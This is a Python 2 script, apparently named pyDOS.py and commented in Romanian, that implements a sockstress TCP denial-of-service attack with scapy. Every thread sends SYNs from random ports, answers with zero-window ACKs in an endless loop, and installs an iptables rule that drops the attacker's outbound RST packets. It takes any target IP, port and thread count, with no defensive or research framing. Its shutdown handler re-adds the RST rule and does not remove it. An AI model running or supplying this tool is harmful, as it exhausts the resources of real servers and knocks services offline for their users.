import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
import thread
import os
import signal
import sys

if len(sys.argv) != 4:
	print "Utilizare - python pyDOS.py [Tinta - IP] [Numar Port] [Threaduri]"
	print "Verificati daca portul tinta e deschis folosind o unealta de analiza."
	print "- Exemplu nmap -"
	sys.exit()

target = str(sys.argv[1])
dstport = int(sys.argv[2])
threads = int(sys.argv[3])

def sockstress(target,dstport):
	while 0 == 0:
		try:
			x = random.randint(0,65535)
			response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags='S'),timeout=1,verbose=0)
			send(IP(dst=target)/TCP(dport=dstport,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)
		except:
			pass

def graceful_shutdown(signal, frame):
	print '\nAi tastat Ctrl+C!'
	print 'Restaurare'
	os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
	sys.exit()

# Crearea unei reguli IPTables pentru prevenirea pachetelor Outbound RST si permiterea conexiuni scapy TCP
os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
signal.signal(signal.SIGINT, graceful_shutdown)

# Gestionarea threadurilor pentru atac
print "Atac initializat... Tasteaza CTRL+C pentru a opri atacul."
for x in range(0,threads):
	thread.start_new_thread(sockstress, (target,dstport))

# Crearea unei bucle infinite, asteptand CTRL+C
while 0 == 0:
	sleep(1)
